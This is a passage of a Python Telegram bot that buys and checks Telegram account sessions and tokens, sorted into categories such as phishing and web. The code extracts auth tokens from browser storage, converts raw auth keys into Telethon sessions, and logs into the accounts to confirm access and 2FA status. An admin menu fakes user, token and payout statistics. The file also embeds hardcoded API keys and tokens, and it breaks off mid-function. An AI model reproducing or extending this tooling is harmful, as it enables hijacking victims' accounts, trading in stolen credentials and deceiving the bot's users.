import logging
import re
import sqlite3
import json
import os
import asyncio
import base64
import struct
import socket
from typing import Dict, List, Optional

import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, CallbackQueryHandler,
    MessageHandler, ContextTypes, filters
)

# Telethon импорты для реальной авторизации в Telegram API
try:
    from telethon import TelegramClient
    from telethon.sessions import StringSession
    from telethon.errors import (
        AuthKeyError, AuthKeyUnregisteredError, AuthKeyInvalidError,
        UserDeactivatedError, UserDeactivatedBanError, SessionPasswordNeededError,
        SessionRevokedError
    )
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False

# Отключаем отладочный спам в консоли от Telethon
logging.getLogger('telethon').setLevel(logging.WARNING)

# ==========================================
# ⚙️ КОНФИГУРАЦИЯ
# ==========================================

BOT_TOKEN = "9036930080:AAG-qHjRQtj4UlndK9FoVQ205A6BPGxaDg4"
ADMIN_IDS = [7459502130]

TG_API_ID = int(os.environ.get("TG_API_ID", "30973996"))
TG_API_HASH = os.environ.get("TG_API_HASH", "dc58ef881ea53b1faafcf6ad974306a7")

SUPPORT_USERNAME = "@ghytara1488"
SUPPORT_TEXT = "Если у вас возникли вопросы, напишите нам."
SUPPORT_HOURS = "Пн–Вс, 10:00 – 22:00 (МСК)"

CRYPTO_PAY_TOKEN = "668980:AAllw4XKBWnQtm7G0Z1Ko3hqhpVsymcG7lg"
XROCKET_API_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhcHBJZCI6IjMwODA6NQIsImp0aSI6ImFwcDozMDgwNjU6NWI2Y2NjMGMtZjg5Yy00OGZiLWFjMGUtZmU4MDQ5NzU1MmRlIiwiaWF0IjoxNzkzODkyNjYzfQ.X7OL7gEyKL0uK29bJcs2h49tm-uAtikVb6JEVDVdOPw"

XROCKET_TESTNET = False
PRICE_PER_TOKEN = 0.1

SESSION_CHECK_TIMEOUT = 5

# Официальные IP-адреса Data Center Telegram для StringSession v1
DC_IPS = {
    1: "149.154.175.50",
    2: "149.154.167.51",
    3: "149.154.175.100",
    4: "149.154.167.91",
    5: "91.108.56.130"
}

# ==========================================
# 💎 EMOJI
# ==========================================
E_ROBOT = '<tg-emoji emoji-id="5346184352994730061">🤖</tg-emoji>'
E_USER = '<tg-emoji emoji-id="5346285456524883921">👤</tg-emoji>'
E_SHIELD = '<tg-emoji emoji-id="5346307103160047735">🛡</tg-emoji>'
E_MONEY = '<tg-emoji emoji-id="5348583560380981713">🤑</tg-emoji>'
E_CHECK = '<tg-emoji emoji-id="5346281810097642712">✅</tg-emoji>'
E_CROSS = '<tg-emoji emoji-id="5346278906699752391">❎</tg-emoji>'
E_STATS = '<tg-emoji emoji-id="5346184030872179395">📊</tg-emoji>'
E_CHART = '<tg-emoji emoji-id="5345954039668448167">📈</tg-emoji>'
E_INFO = '<tg-emoji emoji-id="5346333405539773818">ℹ️</tg-emoji>'
E_LOCK = '<tg-emoji emoji-id="5348128594495314581">🔐</tg-emoji>'
E_STAR = '<tg-emoji emoji-id="5346255254314848940">⚡️</tg-emoji>'
E_PARTY = '<tg-emoji emoji-id="5345778585959436594">🥳</tg-emoji>'
E_WARN = '<tg-emoji emoji-id="5345835790628853538">❗️</tg-emoji>'
E_PURSE = '<tg-emoji emoji-id="5346089374087944625">👛</tg-emoji>'
E_BAG = '<tg-emoji emoji-id="5345965498641192380">🛒</tg-emoji>'
E_SEARCH = '<tg-emoji emoji-id="5345999377343224283">🔍</tg-emoji>'
E_SUPPORT = '<tg-emoji emoji-id="5346184352994730061">🆘</tg-emoji>'
E_TOOLS = '<tg-emoji emoji-id="5346184030872179395">🛠</tg-emoji>'
E_PLUS = '<tg-emoji emoji-id="5348583560380981713">➕</tg-emoji>'

ICON_MONEY = "5348583560380981713"
ICON_STATS = "5346184030872179395"
ICON_USER = "5346285456524883921"
ICON_TOOLS = "5346184030872179395"
ICON_SEARCH = "5345999377343224283"
ICON_SUPPORT = "5346184352994730061"
ICON_BAG = "5345965498641192380"

# ==========================================
# 🗄️ БАЗА ДАННЫХ
# ==========================================

DB_PATH = "bot_database.db"

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as conn:
        conn.executescript("""
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                submitted_tokens INTEGER DEFAULT 0,
                approved_payout REAL DEFAULT 0.0,
                balance REAL DEFAULT 0.0
            );
            CREATE TABLE IF NOT EXISTS global_stats (
                id INTEGER PRIMARY KEY DEFAULT 1,
                total_tokens INTEGER DEFAULT 0,
                total_payout REAL DEFAULT 0.0
            );
            CREATE TABLE IF NOT EXISTS invoices (
                invoice_id TEXT PRIMARY KEY,
                user_id INTEGER,
                amount REAL,
                provider TEXT,
                status TEXT DEFAULT 'pending'
            );
            INSERT OR IGNORE INTO global_stats (id, total_tokens, total_payout) VALUES (1, 0, 0.0);
        """)

def db_add_user(user_id: int, username: str):
    with get_db() as conn:
        conn.execute("INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)", (user_id, username))
        conn.execute("UPDATE users SET username = ? WHERE user_id = ?", (username, user_id))

def db_get_user(user_id: int) -> Optional[sqlite3.Row]:
    with get_db() as conn:
        return conn.execute("SELECT * FROM users WHERE user_id = ?", (user_id,)).fetchone()

def db_get_balance(user_id: int) -> float:
    u = db_get_user(user_id)
    return u["balance"] if u else 0.0

def db_add_balance(user_id: int, amount: float):
    with get_db() as conn:
        conn.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, user_id))

def db_deduct_balance(user_id: int, amount: float) -> bool:
    with get_db() as conn:
        cur = conn.execute(
            "UPDATE users SET balance = balance - ? WHERE user_id = ? AND balance >= ?",
            (amount, user_id, amount)
        )
        return cur.rowcount > 0

def db_get_stats():
    with get_db() as conn:
        cnt = conn.execute("SELECT COUNT(*) FROM users").fetchone()[0]
        s = conn.execute("SELECT total_tokens, total_payout FROM global_stats WHERE id = 1").fetchone()
        return cnt, s["total_tokens"], s["total_payout"]

def db_update_stats(user_id: int, count: int, payout: float):
    with get_db() as conn:
        conn.execute(
            "UPDATE users SET submitted_tokens = submitted_tokens + ?, approved_payout = approved_payout + ? WHERE user_id = ?",
            (count, payout, user_id)
        )
        conn.execute(
            "UPDATE global_stats SET total_tokens = total_tokens + ?, total_payout = total_payout + ? WHERE id = 1",
            (count, payout)
        )

def db_save_invoice(invoice_id: str, user_id: int, amount: float, provider: str):
    with get_db() as conn:
        conn.execute(
            "INSERT OR REPLACE INTO invoices (invoice_id, user_id, amount, provider, status) VALUES (?, ?, ?, ?, 'pending')",
            (str(invoice_id), user_id, amount, provider)
        )

def db_mark_invoice_paid(invoice_id: str) -> Optional[sqlite3.Row]:
    with get_db() as conn:
        inv = conn.execute("SELECT user_id, amount, status FROM invoices WHERE invoice_id = ?", (str(invoice_id),)).fetchone()
        if inv and inv["status"] == "pending":
            conn.execute("UPDATE invoices SET status = 'paid' WHERE invoice_id = ?", (str(invoice_id),))
            return inv
    return None

# ==========================================
# 🛠 РЕАЛЬНАЯ ВАЛИДАЦИЯ ВХОДА В ТЕЛЕГРАМ
# ==========================================

BOT_TOKEN_REGEX = re.compile(r"^[0-9]{8,10}:[A-Za-z0-9_-]{35}$")

def parse_web_token(text: str) -> Optional[str]:
    """Извлекает чистый токен из JS-кода локального хранилища браузера."""
    match = re.search(r'"token"\s*:\s*"([^"]+)"', text)
    if match:
        return match.group(1).strip()
    match_single = re.search(r"'token'\s*:\s*'([^']+)'", text)
    if match_single:
        return match_single.group(1).strip()
    match_raw = re.search(r'(?:auth_key|token|session)\s*[:=]\s*["\']?([A-Za-z0-9_\-]+)["\']?', text, re.IGNORECASE)
    if match_raw:
        return match_raw.group(1).strip()
    return None

def clean_and_format_token(item: str) -> str:
    item = item.strip()
    extracted = parse_web_token(item)
    if extracted:
        item = extracted
    item = item.strip("\"' \t\n\r")
    return item

def extract_tokens(text: str) -> List[str]:
    tokens = []
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        cleaned = clean_and_format_token(line)
        if cleaned:
            tokens.append(cleaned)
    return list(dict.fromkeys(tokens))

async def validate_bot_token_real(token: str) -> dict:
    url = f"https://api.telegram.org/bot{token}/getMe"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=4) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    if data.get("ok"):
                        bot_username = data["result"].get("username", "bot")
                        return {"valid": True, "type": "bot", "info": f"@{bot_username}"}
                return {"valid": False, "type": "bot", "reason": "invalid_bot_token"}
    except Exception:
        return {"valid": False, "type": "bot", "reason": "connection_error"}

def raw_key_to_string_session(raw_key_str: str, dc_id: int = 2) -> Optional[str]:
    try:
        b64 = raw_key_str.replace('-', '+').replace('_', '/')
        padding = 4 - (len(b64) % 4)
        if padding != 4:
            b64 += '=' * padding
            
        key_bytes = base64.b64decode(b64)
        
        if len(key_bytes) >= 256:
            key_bytes = key_bytes[-256:]
            
        if len(key_bytes) == 256:
            ip_str = DC_IPS.get(dc_id, "149.154.167.51")
            ip_packed = socket.inet_aton(ip_str)
            session_bytes = struct.pack('>B4sH256s', dc_id, ip_packed, 443, key_bytes)
            return '1' + base64.b64encode(session_bytes).decode('ascii')
    except Exception:
        pass
    return None

async def try_connect_and_auth(session_obj) -> Optional[dict]:
    client = TelegramClient(session_obj, TG_API_ID, TG_API_HASH)
    try:
        await asyncio.wait_for(client.connect(), timeout=3)
        if await client.is_user_authorized():
            me = await asyncio.wait_for(client.get_me(), timeout=3)
            if me:
                uname = f"@{me.username}" if me.username else f"ID:{me.id}"
                return {"valid": True, "reason": f"Успешный вход ({uname})", "info": uname, "user_id": me.id}
    except SessionPasswordNeededError:
        return {"valid": True, "reason": "Валидный ключ (Включен 2FA)", "info": "Нужен 2FA пароль", "has_2fa": True}
    except Exception:
        pass
    finally:
        try:
            await client.disconnect()
        except Exception:
            pass
    return None

async def validate_telethon_session_real(session_string: str) -> dict:
    session_string = clean_and_format_token(session_string)
    if not session_string:
        return {"valid": False, "reason": "Пустая строка сессии"}

    if not TELETHON_AVAILABLE:
        return {"valid": False, "reason": "Telethon не установлен"}

    # 1. Попытка подключения как стандартной StringSession
    try:
        session_obj = StringSession(session_string)
        res = await try_connect_and_auth(session_obj)
        if res:
            return res
    except Exception:
        pass

    # 2. Быстрый асинхронный поиск нужного DC для конвертированного AuthKey
    tasks = []
    for dc in [2, 1, 4, 3, 5]:
        converted = raw_key_to_string_session(session_string, dc_id=dc)
        if converted:
            try:
                session_obj = StringSession(converted)
                tasks.append(try_connect_and_auth(session_obj))
            except Exception:
                pass

    if tasks:
        completed_results = await asyncio.gather(*tasks, return_exceptions=True)
        for res in completed_results:
            if isinstance(res, dict) and res.get("valid"):
                return res

    return {"valid": False, "reason": "Сессия не авторизована или ключ сменен"}

async def real_check_token_or_session(item: str) -> dict:
    item = clean_and_format_token(item)
    if BOT_TOKEN_REGEX.match(item):
        return await validate_bot_token_real(item)
    try:
        return await asyncio.wait_for(validate_telethon_session_real(item), timeout=SESSION_CHECK_TIMEOUT)
    except asyncio.TimeoutError:
        return {"valid": False, "reason": "Таймаут подключения к Telegram"}
    except Exception as e:
        return {"valid": False, "reason": f"Ошибка: {type(e).__name__}"}

def convert_tokens(tokens: List[str], target_fmt: str) -> str:
    cleaned_tokens = [clean_and_format_token(t) for t in tokens if clean_and_format_token(t)]
    if target_fmt == "txt":
        return "\n".join(cleaned_tokens)
    elif target_fmt == "json":
        return json.dumps([{"id": i + 1, "token": t} for i, t in enumerate(cleaned_tokens)], indent=4, ensure_ascii=False)
    elif target_fmt == "web":
        return json.dumps({"version": "1.0", "count": len(cleaned_tokens), "tokens": [{"token": t} for t in cleaned_tokens]}, indent=2, ensure_ascii=False)
    return "\n".join(cleaned_tokens)

# ==========================================
# 💳 ПЛАТЕЖНЫЕ ФУНКЦИИ
# ==========================================

PENDING_INVOICES: Dict[str, tuple] = {}

async def create_cryptobot_invoice(user_id: int, amount_usd: float):
    from crypto_pay_api import CryptoPayAsync, CryptoPayConfig
    cfg = CryptoPayConfig(token=CRYPTO_PAY_TOKEN)
    async with CryptoPayAsync(cfg) as cp:
        invoice = await cp.create_invoice(
            asset="USDT", amount=amount_usd,
            description=f"Пополнение для {user_id}",
            payload=f"topup_{user_id}_{amount_usd}",
            expires_in=3600
        )
        inv_id = str(invoice["invoice_id"])
        PENDING_INVOICES[inv_id] = (user_id, amount_usd, "crypto")
        db_save_invoice(inv_id, user_id, amount_usd, "crypto")
        return invoice["pay_url"], inv_id

async def verify_cryptobot_invoice_single(inv_id: str) -> bool:
    try:
        from crypto_pay_api import CryptoPayAsync, CryptoPayConfig
        cfg = CryptoPayConfig(token=CRYPTO_PAY_TOKEN)
        async with CryptoPayAsync(cfg) as cp:
            invoices = await cp.get_invoices(invoice_ids=inv_id)
            if invoices:
                inv = invoices[0]
                if inv.get("status") == "paid":
                    res = db_mark_invoice_paid(inv_id)
                    if res:
                        db_add_balance(res["user_id"], res["amount"])
                        return True
                    else:
                        return True
    except Exception as e:
        logging.error(f"Single invoice check error: {e}")
    return False

async def create_xrocket_invoice(user_id: int, amount_usd: float):
    from aiorocket2 import xRocketClient
    client = xRocketClient(api_key=XROCKET_API_KEY, testnet=XROCKET_TESTNET)
    invoice = await client.create_invoice(
        amount=amount_usd,
        currency="USDT",
        description=f"Пополнение баланса для {user_id}",
        num_payments=1,
        expired_in=3600,
    )
    inv_id = str(invoice.id)
    PENDING_INVOICES[inv_id] = (user_id, amount_usd, "xrocket")
    db_save_invoice(inv_id, user_id, amount_usd, "xrocket")
    pay_url = getattr(invoice, "url", None) or getattr(invoice, "link", None)
    if not pay_url:
        raise ValueError("xRocket invoice has no payment URL")
    return pay_url, inv_id

async def check_pending_invoices(context: ContextTypes.DEFAULT_TYPE):
    with get_db() as conn:
        pending_rows = conn.execute("SELECT invoice_id, user_id, amount, provider FROM invoices WHERE status = 'pending'").fetchall()

    for row in pending_rows:
        iid = row["invoice_id"]
        uid = row["user_id"]
        amt = row["amount"]
        provider = row["provider"]

        if provider == "crypto":
            try:
                from crypto_pay_api import CryptoPayAsync, CryptoPayConfig
                cfg = CryptoPayConfig(token=CRYPTO_PAY_TOKEN)
                async with CryptoPayAsync(cfg) as cp:
                    invoices = await cp.get_invoices(invoice_ids=iid)
                    for inv in invoices:
                        if inv.get("status") == "paid":
                            res = db_mark_invoice_paid(iid)
                            if res:
                                db_add_balance(uid, amt)
                                PENDING_INVOICES.pop(iid, None)
                                try:
                                    await context.bot.send_message(
                                        uid, f"{E_PARTY} <b>Баланс пополнен на {amt:.2f} $!</b>",
                                        parse_mode='HTML'
                                    )
                                except Exception:
                                    pass
            except Exception as e:
                logging.error(f"CryptoBot check error for invoice {iid}: {e}")

        elif provider == "xrocket":
            try:
                from aiorocket2 import xRocketClient
                from aiorocket2.enums import InvoiceStatus
                client = xRocketClient(api_key=XROCKET_API_KEY, testnet=XROCKET_TESTNET)
                inv = await client.get_invoice(int(iid))
                if inv.status == InvoiceStatus.PAID:
                    res = db_mark_invoice_paid(iid)
                    if res:
                        db_add_balance(uid, amt)
                        PENDING_INVOICES.pop(iid, None)
                        try:
                            await context.bot.send_message(
                                uid, f"{E_PARTY} <b>Баланс пополнен на {amt:.2f} $!</b>",
                                parse_mode='HTML'
                            )
                        except Exception:
                            pass
            except Exception as e:
                logging.error(f"xRocket invoice {iid} check error: {e}")

# ==========================================
# 🎨 КНОПКИ И МЕНЮ
# ==========================================

def make_btn(text, callback_data=None, url=None, style=None, icon_id=None):
    kwargs = {"text": text}
    if callback_data is not None: kwargs["callback_data"] = callback_data
    if url is not None: kwargs["url"] = url
    if style is not None: kwargs["style"] = style
    if icon_id is not None: kwargs["icon_custom_emoji_id"] = icon_id
    return InlineKeyboardButton(**kwargs)

def main_menu_buttons(is_admin: bool = False):
    rows = [
        [make_btn("Сдать токены", "submit_tokens", style="success", icon_id=ICON_BAG)],
        [make_btn("Форматирование (0.1$/ток)", "format_menu", style="primary", icon_id=ICON_TOOLS),
         make_btn("Проверка (0.1$/ток)", "check_menu", style="primary", icon_id=ICON_SEARCH)],
        [make_btn("Профиль", "my_profile", style="primary", icon_id=ICON_USER),
         make_btn("Статистика", "global_stats", style="primary", icon_id=ICON_STATS)],
        [make_btn("Поддержка", "support_menu", style="primary", icon_id=ICON_SUPPORT)]
    ]
    if is_admin:
        rows.append([make_btn("Админ-панель", "admin_panel", style="primary", icon_id=ICON_TOOLS)])
    return InlineKeyboardMarkup(rows)

def categories_buttons():
    return InlineKeyboardMarkup([
        [make_btn("Веб", "cat_web", style="primary"), make_btn("Андроид", "cat_android", style="primary")],
        [make_btn("Фиш", "cat_phish", style="primary"), make_btn("Новорег", "cat_newreg", style="primary")],
        [make_btn("2ФА", "cat_2fa", style="primary"), make_btn("Без 2ФА", "cat_no2fa", style="primary")],
        [make_btn("Назад", "main_menu", style="danger")]
    ])

def cancel_button():
    return InlineKeyboardMarkup([[make_btn("Отмена", "main_menu", style="danger")]])

def back_button():
    return InlineKeyboardMarkup([[make_btn("Назад", "main_menu", style="danger")]])

def format_menu_buttons():
    return InlineKeyboardMarkup([
        [make_btn("В .txt", "fmt_target:txt", style="primary"), make_btn("В .json", "fmt_target:json", style="primary")],
        [make_btn("В .web", "fmt_target:web", style="primary")],
        [make_btn("Назад", "main_menu", style="danger")]
    ])

def check_result_buttons():
    return InlineKeyboardMarkup([
        [make_btn("Проверить ещё", "check_menu", style="success")],
        [make_btn("В меню", "main_menu", style="danger")]
    ])

def support_buttons():
    return InlineKeyboardMarkup([
        [make_btn("Написать в поддержку", url=f"https://t.me/{SUPPORT_USERNAME.lstrip('@')}", style="primary", icon_id=ICON_SUPPORT)],
        [make_btn("Назад", "main_menu", style="danger")]
    ])

def profile_buttons(is_admin: bool = False):
    rows = [[make_btn("Пополнить баланс", "topup_balance", style="success", icon_id=ICON_MONEY)]]
    if is_admin:
        rows.append([make_btn("Админ-панель", "admin_panel", style="primary", icon_id=ICON_TOOLS)])
    rows.append([make_btn("Назад", "main_menu", style="danger")])
    return InlineKeyboardMarkup(rows)

def topup_method_buttons(amount: float):
    return InlineKeyboardMarkup([
        [make_btn("CryptoBot", f"topup_pay:crypto:{amount}", style="primary")],
        [make_btn("xRocket", f"topup_pay:xrocket:{amount}", style="primary")],
        [make_btn("Отмена", "my_profile", style="danger")]
    ])

def topup_pay_buttons(url: str, inv_id: str):
    return InlineKeyboardMarkup([
        [make_btn("Оплатить", url=url, style="success")],
        [make_btn("🔄 Проверить оплату", f"check_payment:{inv_id}", style="primary")],
        [make_btn("В профиль", "my_profile", style="danger")]
    ])

def admin_approval_buttons(req_id: str, count: int):
    return InlineKeyboardMarkup([
        [make_btn("Одобрить", f"adm_app:{req_id}:{count}", style="success"),
         make_btn("Отклонить", f"adm_rej:{req_id}", style="danger")],
        [make_btn("В .web", f"conv:web:{req_id}", style="primary"),
         make_btn("В .json", f"conv:json:{req_id}", style="primary"),
         make_btn("В .txt", f"conv:txt:{req_id}", style="primary")]
    ])

def admin_menu_buttons():
    return InlineKeyboardMarkup([
        [make_btn("Накрутить пользователя", "adm_fake_user", style="primary")],
        [make_btn("Накрутить токены", "adm_fake_tokens", style="primary")],
        [make_btn("Накрутить выплаты", "adm_fake_payout", style="primary")],
        [make_btn("Накрутить баланс", "adm_fake_balance", style="primary")],
        [make_btn("В меню", "main_menu", style="danger")]
    ])

# ==========================================
# 🚀 ХЭНДЛЕРЫ СООБЩЕНИЙ И КОМАНД
# ==========================================

USER_STATES: Dict[int, Dict] = {}
PENDING_TOKENS: Dict[str, str] = {}

async def start_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    db_add_user(user.id, user.username or "Anonymous")
    USER_STATES.pop(user.id, None)
    is_admin = user.id in ADMIN_IDS
    text = (
        f"{E_ROBOT} <b>Добро пожаловать!</b>\n\n"
        f"{E_STAR} Принимаем сессии/токены, реально заходим на аккаунты для проверки.\n"
        f"{E_SHIELD} Стоимость проверки: <b>{PRICE_PER_TOKEN}$</b> за токен.\n\n"
        f"Выберите действие:"
    )
    if update.message:
        await update.message.reply_html(text, reply_markup=main_menu_buttons(is_admin))

async def admin_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_html(f"{E_CROSS} <b>Доступ запрещён.</b>")
        return
    USER_STATES.pop(user_id, None)
    await update.message.reply_html(
        f"{E_TOOLS} <b>Админ-панель</b>\n\n{E_INFO} ID: <code>{user_id}</code>\nВыберите действие:",
        reply_markup=admin_menu_buttons()
    )

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = query.from_user.id
    is_admin = user_id in ADMIN_IDS

    if data == "main_menu":
        USER_STATES.pop(user_id, None)
        await query.edit_message_text(
            f"{E_ROBOT} <b>Главное меню</b>\n\n{E_INFO} Выберите раздел:",
            parse_mode='HTML', reply_markup=main_menu_buttons(is_admin)
        )

    elif data == "admin_panel":
        if not is_admin:
            await query.answer("Доступ запрещён.", show_alert=True)
            return
        USER_STATES.pop(user_id, None)
        await query.edit_message_text(
            f"{E_TOOLS} <b>Админ-панель</b>\n\nВыберите действие:",
            parse_mode='HTML', reply_markup=admin_menu_buttons()
        )

    elif data == "adm_fake_user":
        if not is_admin: return
        USER_STATES[user_id] = {"step": "adm_fake_user"}
        await query.edit_message_text(
            "Введите ID пользователя и username:\n<code>123456789 @username</code>",
            parse_mode='HTML', reply_markup=cancel_button()
        )

    elif data == "adm_fake_tokens":
        if not is_admin: return
        USER_STATES[user_id] = {"step": "adm_fake_tokens"}
        await query.edit_message_text(
            "Введите ID и количество токенов:\n<code>123456789 100</code>",
            parse_mode='HTML', reply_markup=cancel_button()
        )

    elif data == "adm_fake_payout":
        if not is_admin: return
        USER_STATES[user_id] = {"step": "adm_fake_payout"}
        await query.edit_message_text(
            "Введите ID и сумму выплаты ($):\n<code>123456789 50.0</code>",
            parse_mode='HTML', reply_markup=cancel_button()
        )

    elif data == "adm_fake_balance":
        if not is_admin: return
        USER_STATES[user_id] = {"step": "adm_fake_balance"}
        await query.edit_message_text(
            "Введите ID и сумму баланса ($):\n<code>123456789 10.0</code>",
            parse_mode='HTML', reply_markup=cancel_button()
        )

    elif data == "my_profile":
        u = db_get_user(user_id)
        if not u:
            db_add_user(user_id, query.from_user.username or "Anonymous")
            u = db_get_user(user_id)
        text = (
            f"{E_USER} <b>Ваш Профиль</b>\n\n"
            f"<b>ID:</b> <code>{user_id}</code>\n"
            f"{E_PURSE} <b>Сдано токенов:</b> <code>{u['submitted_tokens']}</code> шт.\n"
            f"{E_MONEY} <b>Заработано:</b> <code>{u['approved_payout']:.2f} $</code>\n"
            f"{E_PLUS} <b>Баланс:</b> <code>{u['balance']:.2f} $</code>\n"
            f"{E_INFO} <b>Цена проверки:</b> {PRICE_PER_TOKEN}$/токен\n"
        )
        await query.edit_message_text(text, parse_mode='HTML', reply_markup=profile_buttons(is_admin))

    elif data == "topup_balance":
        USER_STATES[user_id] = {"step": "topup_entering_amount"}
        await query.edit_message_text(
            f"{E_PLUS} <b>Пополнение баланса</b>\n\nВведите сумму в $ (минимум 0.1):",
            parse_mode='HTML', reply_markup=cancel_button()
        )

    elif data.startswith("topup_pay:"):
        _, method, amount_str = data.split(":")
        amount = float(amount_str)
        try:
            if method == "crypto":
                url, inv_id = await create_cryptobot_invoice(user_id, amount)
            else:
                url, inv_id = await create_xrocket_invoice(user_id, amount)
            await query.edit_message_text(
                f"{E_CHECK} <b>Счёт создан на {amount:.2f} $</b>\n\n"
                f"Оплатите по кнопке ниже и нажмите кнопку «Проверить оплату».",
                parse_mode='HTML', reply_markup=topup_pay_buttons(url, inv_id)
            )
        except Exception as e:
            logging.error(f"Invoice creation error: {e}")
            await query.edit_message_text(
                f"{E_WARN} Ошибка создания счёта: {e}",
                parse_mode='HTML', reply_markup=back_button()
            )

    elif data.startswith("check_payment:"):
        _, inv_id = data.split(":")
        is_paid = await verify_cryptobot_invoice_single(inv_id)
        if is_paid:
            u = db_get_user(user_id)
            await query.answer("Успешно! Баланс пополнен.", show_alert=True)
            await query.edit_message_text(
                f"{E_PARTY} <b>Оплата подтверждена!</b>\n\n"
                f"Ваш текущий баланс: <b>{u['balance']:.2f} $</b>",
                parse_mode='HTML', reply_markup=profile_buttons(is_admin)
            )
        else:
            await query.answer("Оплата еще не поступила. Попробуйте снова после оплаты.", show_alert=True)

    elif data == "global_stats":
        u_cnt, tokens, payout = db_get_stats()
        await query.edit_message_text(
            f"{E_STATS} <b>Статистика</b>\n\n"
            f"{E_USER} Пользователей: <code>{u_cnt}</code>\n"
            f"{E_BAG} Токенов: <code>{tokens}</code>\n"
            f"{E_CHART} Выплачено: <code>{payout:.2f} $</code>",
            parse_mode='HTML', reply_markup=back_button()
        )

    elif data == "support_menu":
        await query.edit_message_text(
            f"{E_SUPPORT} <b>Поддержка</b>\n\n{SUPPORT_TEXT}\n\n"
            f"{E_INFO} График: {SUPPORT_HOURS}\n{E_USER} Контакт: {SUPPORT_USERNAME}",
            parse_mode='HTML', reply_markup=support_buttons()
        )

    elif data == "submit_tokens":
        USER_STATES[user_id] = {"step": "selecting_cat"}
        await query.edit_message_text(
            f"{E_BAG} <b>Выберите категорию:</b>",
            parse_mode='HTML', reply_markup=categories_buttons()
        )

    elif data.startswith("cat_"):
        cat_map = {"cat_web": "Веб", "cat_android": "Андроид", "cat_phish": "Фиш",
                   "cat_newreg": "Новорег", "cat_2fa": "2ФА", "cat_no2fa": "Без 2ФА"}
        cat_name = cat_map.get(data, "Общая")
        USER_STATES[user_id] = {"step": "entering_count", "category": cat_name}
        await query.edit_message_text(
            f"{E_CHECK} Категория: <b>{cat_name}</b>\n\n{E_SEARCH} Введите заявленное количество токенов:",
            parse_mode='HTML', reply_markup=cancel_button()
        )

    elif data.startswith("conv:") and is_admin:
        _, fmt, req_id = data.split(":")
        raw = PENDING_TOKENS.get(req_id)
        if not raw:
            await query.answer("Данные недоступны.", show_alert=True)
            return
        toks = extract_tokens(raw)
        converted = convert_tokens(toks, fmt)
        await context.bot.send_document(
            chat_id=user_id, document=bytes(converted, 'utf-8'), filename=f"tokens.{fmt}",
            caption=f"{E_CHECK} Сконвертировано в .{fmt}"
        )
        await query.answer("Готово!")

    elif data.startswith("adm_app:") and is_admin:
        _, req_id, count = data.split(":")
        target_user = int(req_id.split("_")[0])
        cnt = int(count)
        payout = cnt * 1.0
        db_update_stats(target_user, cnt, payout)
        await query.edit_message_text(f"{query.message.text}\n\n{E_CHECK} <b>ОДОБРЕНО И ВЫПЛАЧЕНО</b>", parse_mode='HTML')
        await context.bot.send_message(
            target_user,
            f"{E_PARTY} <b>Заявка на {cnt} токенов одобрена!</b>\nНачислено: <b>{payout:.2f} $</b>",
            parse_mode='HTML'
        )

    elif data.startswith("adm_rej:") and is_admin:
        _, req_id = data.split(":")
        target_user = int(req_id.split("_")[0])
        await query.edit_message_text(f"{query.message.text}\n\n{E_CROSS} <b>ОТКЛОНЕНО</b>", parse_mode='HTML')
        await context.bot.send_message(
            target_user, f"{E_CROSS} <b>Заявка отклонена.</b>", parse_mode='HTML'
        )

    elif data == "format_menu":
        USER_STATES[user_id] = {"step": "format_awaiting"}
        await query.edit_message_text(
            f"{E_TOOLS} <b>Форматирование</b>\n\n"
            f"{E_INFO} Стоимость: <b>{PRICE_PER_TOKEN}$</b> за токен.\n"
            f"Отправьте файл или токены текстом:",
            parse_mode='HTML', reply_markup=cancel_button()
        )

    elif data.startswith("fmt_target:"):
        _, fmt = data.split(":")
        state = USER_STATES.get(user_id)
        if not state or "fmt_raw" not in state:
            await query.answer("Сначала отправьте токены.", show_alert=True)
            return
        toks = extract_tokens(state["fmt_raw"])
        cost = len(toks) * PRICE_PER_TOKEN
        if not db_deduct_balance(user_id, cost):
            await query.answer(f"Недостаточно средств! Нужно {cost:.2f} $", show_alert=True)
            return
        converted = convert_tokens(toks, fmt)
        await context.bot.send_document(
            chat_id=user_id, document=bytes(converted, 'utf-8'), filename=f"formatted.{fmt}",
            caption=f"{E_CHECK} Готово! Токенов: <b>{len(toks)}</b>\nСписано: <b>{cost:.2f} $</b>",
            parse_mode='HTML'
        )
        USER_STATES.pop(user_id, None)
        await query.message.reply_html(f"{E_PARTY} Файл отправлен.", reply_markup=main_menu_buttons(is_admin))

    elif data == "check_menu":
        USER_STATES[user_id] = {"step": "check_awaiting"}
        await query.edit_message_text(
            f"{E_SEARCH} <b>Проверка сессий / токенов</b>\n\n"
            f"{E_INFO} Стоимость: <b>{PRICE_PER_TOKEN}$</b> за токен.\n"
            f"Отправьте сессии (StringSession) или токены в файле/текстом:",
            parse_mode='HTML', reply_markup=cancel_button()
        )

async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    state = USER_STATES.get(user_id)
    if not state:
        return

    step = state.get("step")
    is_admin = user_id in ADMIN_IDS

    if step == "adm_fake_user" and is_admin:
        try:
            parts = update.message.text.split()
            uid, uname = int(parts[0]), parts[1]
            db_add_user(uid, uname)
            await update.message.reply_html(f"{E_CHECK} Пользователь <code>{uid}</code> добавлен.")
        except Exception:
            await update.message.reply_html(f"{E_WARN} Формат: <code>123456789 @username</code>")
        USER_STATES.pop(user_id, None)

    elif step == "adm_fake_tokens" and is_admin:
        try:
            parts = update.message.text.split()
            uid, cnt = int(parts[0]), int(parts[1])
            db_update_stats(uid, cnt, 0)
